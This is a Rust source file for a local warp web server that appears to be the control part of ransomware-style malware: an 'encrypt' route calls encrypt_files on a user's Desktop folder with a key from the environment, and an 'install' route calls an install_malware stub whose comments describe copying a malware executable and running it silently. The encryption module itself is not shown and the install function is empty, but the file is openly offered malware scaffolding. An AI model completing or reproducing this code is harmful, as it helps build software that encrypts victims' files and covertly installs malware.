mod encryption;
mod rules;

use encryption::encrypt_files;
use rules::check_rules;
use std::sync::Arc;
use std::path::PathBuf;
use tokio::sync::Mutex;
use warp::Filter;
use dotenvy::dotenv;
use serde::{Deserialize, Serialize};
use warp::reply::json as warp_json;
use warp::reply::Json; // Import Json

/// The main function that initializes the application and starts the server.
#[tokio::main]
async fn main() {
    // Load environment variables from a .env file
    dotenv().ok();

    // Create a shared state with a mutex for thread safety
    let state = Arc::new(Mutex::new(State::new()));

    // Clone the state for each route
    let state_clone1 = Arc::clone(&state);
    let state_clone2 = Arc::clone(&state);
    let state_clone3 = Arc::clone(&state);

    // Define the encryption route
    let encrypt_route = warp::path("encrypt")
        .and(warp::post())
        .and(warp::any().map(move || state_clone1.clone()))
        .and_then(|state: Arc<Mutex<State>>| {
            async move {
                let state = state.lock().await;
                encrypt_files(&state.key, &state.target_directory);
                Ok::<Json, warp::Rejection>(warp_json(&*state))
            }
        });

    // Define the rules route
    let rules_route = warp::path("rules")
        .and(warp::get())
        .and(warp::any().map(move || state_clone2.clone()))
        .and_then(|state: Arc<Mutex<State>>| {
            async move {
                let state = state.lock().await;
                // Pass the target directory as PathBuf to check_rules
                check_rules(
                    &rules::State::new(state.rules_broken),
                    PathBuf::from(&state.target_directory),
                );
                Ok::<Json, warp::Rejection>(warp_json(&serde_json::json!({ "success": true })))
            }
        });

    // Define the installation route
    let install_route = warp::path("install")
        .and(warp::post())
        .and(warp::any().map(move || state_clone3.clone()))
        .and_then(|state: Arc<Mutex<State>>| {
            async move {
                let state = state.lock().await;
                install_malware(&state);
                Ok::<Json, warp::Rejection>(warp_json(&serde_json::json!({ "success": true })))
            }
        });

    // Start the server and listen on the specified address and port
    warp::serve(encrypt_route.or(rules_route).or(install_route))
        .run(([127, 0, 0, 1], 3030))
        .await;
}

/// Represents the state of the application, including the encryption key and target directory.
#[derive(Serialize, Deserialize)]
struct State {
    key: Vec<u8>,
    target_directory: String,
    rules_broken: bool,
}

impl State {
    /// Creates a new State instance with the encryption key and target directory.
    fn new() -> Self {
        let key_str = std::env::var("KEY").expect("KEY must be set");
        let key = hex::decode(key_str).expect("KEY must be a valid hex string");
        Self {
            key,
            target_directory: String::from("C:\\Users\\YourUsername\\Desktop\\TOP"),
            rules_broken: false,
        }
    }
}

/// Represents the data structure for receiving key data.
#[derive(Deserialize)]
struct KeyData {
    key: String,
}

/// Installs the malware by performing necessary actions.
fn install_malware(_state: &State) {
    // Implement the logic to install the malware here
    // For example, you can write a script to copy the malware executable to the desired location
    // and run it silently.
    println!("Malware installed successfully!");
}

